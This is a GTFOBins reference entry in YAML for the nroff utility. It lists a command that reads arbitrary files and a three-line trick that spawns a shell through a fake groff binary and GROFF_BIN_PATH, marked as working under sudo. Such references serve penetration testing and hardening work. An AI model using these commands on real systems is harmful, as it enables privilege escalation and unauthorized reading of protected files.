<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/nroff -->
---
functions:
  file-read:
  - binary: false
    code: |-
      nroff /path/to/input-file
    comment: |-
      The file is typeset and some warning messages may appear.
    contexts:
      sudo:
      unprivileged:
  shell:
  - code: |-
      echo /bin/sh >groff
      chmod +x groff
      GROFF_BIN_PATH=. nroff
    contexts:
      sudo:
      unprivileged:
...
